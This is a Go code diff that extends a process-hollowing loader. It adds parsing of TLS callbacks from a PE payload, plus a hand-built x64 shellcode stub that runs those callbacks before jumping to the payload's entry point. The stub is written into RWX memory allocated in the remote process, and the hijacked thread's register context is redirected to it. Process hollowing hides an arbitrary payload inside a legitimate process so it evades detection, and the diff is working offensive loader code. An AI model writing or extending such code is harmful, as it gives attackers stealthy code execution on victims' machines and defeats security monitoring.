@@ -384,6 +384,10 @@ func executeProcessHollowing(payload []byte) {
 
 	secs := hollowParseSections(buf, peOff)
 
+	// Collect TLS callbacks now, while the buf still has original VAs (before
+	// IAT fix or relocation patching which would shift the pointer values).
+	tlsCallbacks := hollowParseTLSCallbacks(buf, imageBase)
+
 	// Fix imports FIRST — must happen before relocations which would shift
 	// the thunk values and corrupt lookup entries.
 	hollowFixImports64(buf, optOff, secs)
@@ -428,7 +432,30 @@ func executeProcessHollowing(payload []byte) {
 
 	// Set entry point via Rcx (standard x64 hollowing: RtlUserThreadStart
 	// calls the function address in Rcx at thread start).
-	ctx64SetRcx(&ctx, uint64(base)+uint64(entryRVA))
+	//
+	// When the payload has TLS callbacks (e.g. Rust/MSVC binaries), we inject
+	// a small x64 stub that calls every callback with the standard arguments
+	// (imageBase, DLL_PROCESS_ATTACH=1, 0) before jumping to the real entry.
+	realEntry := uint64(base) + uint64(entryRVA)
+	effectiveEntry := realEntry
+
+	if len(tlsCallbacks) > 0 {
+		// Re-base callback VAs from original imageBase to the allocated base.
+		adjusted := make([]uint64, len(tlsCallbacks))
+		for i, cb := range tlsCallbacks {
+			adjusted[i] = uint64(base) + (cb - imageBase)
+		}
+		if stub := hollowBuildTLSStub(uint64(base), realEntry, adjusted); stub != nil {
+			// Allocate RWX memory for the stub in the remote process.
+			stubBase, _, _ := procVirtualAllocEx.Call(
+				hProc, 0, uintptr(len(stub)), 0x3000, 0x40)
+			if stubBase != 0 && hollowWriteMem(hProc, stubBase, stub) {
+				effectiveEntry = uint64(stubBase)
+			}
+		}
+	}
+
+	ctx64SetRcx(&ctx, effectiveEntry)
 	procSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 	procResumeThread.Call(hThread)
 }
@@ -472,4 +499,94 @@ func hollowWriteMem(hProcess, addr uintptr, data []byte) bool {
 		uintptr(unsafe.Pointer(&written)),
 	)
 	return r != 0
+}
+
+// ---------------------------------------------------------------------------
+// TLS callback helpers
+// ---------------------------------------------------------------------------
+
+// hollowParseTLSCallbacks returns the absolute VA list of TLS callback
+// functions recorded in data directory #9 of the PE payload.
+// The payload must be at its original imageBase (before any relocation patch).
+// Returns nil when no TLS directory or no callbacks are present.
+func hollowParseTLSCallbacks(payload []byte, imageBase uint64) []uint64 {
+	if len(payload) < 0x40 {
+		return nil
+	}
+	peOff := binary.LittleEndian.Uint32(payload[0x3C:])
+	optOff := peOff + 24
+	// PE32+ DataDirectory starts at optOff+112; entry #9 is TLS.
+	tlsDirOff := optOff + 112 + 9*8
+	if int(tlsDirOff+8) > len(payload) {
+		return nil
+	}
+	tlsRVA := binary.LittleEndian.Uint32(payload[tlsDirOff:])
+	if tlsRVA == 0 {
+		return nil
+	}
+	secs := hollowParseSections(payload, peOff)
+	tlsFileOff, ok := hollowRvaToOffset(secs, tlsRVA)
+	if !ok || int(tlsFileOff+32) > len(payload) {
+		return nil
+	}
+	// IMAGE_TLS_DIRECTORY64.AddressOfCallBacks is at offset +24.
+	cbVA := binary.LittleEndian.Uint64(payload[tlsFileOff+24:])
+	if cbVA == 0 {
+		return nil
+	}
+	cbRVA := uint32(cbVA - imageBase)
+	cbFileOff, ok := hollowRvaToOffset(secs, cbRVA)
+	if !ok {
+		return nil
+	}
+	var callbacks []uint64
+	for i := 0; ; i++ {
+		off := cbFileOff + uint32(i*8)
+		if int(off+8) > len(payload) {
+			break
+		}
+		va := binary.LittleEndian.Uint64(payload[off:])
+		if va == 0 {
+			break
+		}
+		callbacks = append(callbacks, va)
+	}
+	return callbacks
+}
+
+// hollowBuildTLSStub generates x64 shellcode that calls every TLS callback
+// with the standard (imageBase, DLL_PROCESS_ATTACH=1, 0) arguments and then
+// jumps to entryPoint.  callbacks must be already adjusted to the new base.
+func hollowBuildTLSStub(imageBase, entryPoint uint64, callbacks []uint64) []byte {
+	if len(callbacks) == 0 {
+		return nil
+	}
+	buf8 := make([]byte, 8)
+	var stub []byte
+
+	// sub rsp, 0x28  ;  mov [rsp+0x20], rbx
+	stub = append(stub,
+		0x48, 0x83, 0xEC, 0x28,
+		0x48, 0x89, 0x5C, 0x24, 0x20,
+	)
+	for _, cb := range callbacks {
+		stub = append(stub, 0x48, 0xB9) // mov rcx, imageBase
+		binary.LittleEndian.PutUint64(buf8, imageBase)
+		stub = append(stub, buf8...)
+		stub = append(stub, 0xBA, 0x01, 0x00, 0x00, 0x00) // mov edx, 1  (DLL_PROCESS_ATTACH)
+		stub = append(stub, 0x45, 0x31, 0xC0)             // xor r8d, r8d
+		stub = append(stub, 0x48, 0xB8)                   // mov rax, cb
+		binary.LittleEndian.PutUint64(buf8, cb)
+		stub = append(stub, buf8...)
+		stub = append(stub, 0xFF, 0xD0) // call rax
+	}
+	// mov rbx, [rsp+0x20]  ;  add rsp, 0x28
+	stub = append(stub, 0x48, 0x8B, 0x5C, 0x24, 0x20)
+	stub = append(stub, 0x48, 0x83, 0xC4, 0x28)
+	// mov rax, entryPoint  ;  jmp rax
+	stub = append(stub, 0x48, 0xB8)
+	binary.LittleEndian.PutUint64(buf8, entryPoint)
+	stub = append(stub, buf8...)
+	stub = append(stub, 0xFF, 0xE0)
+	return stub
 }
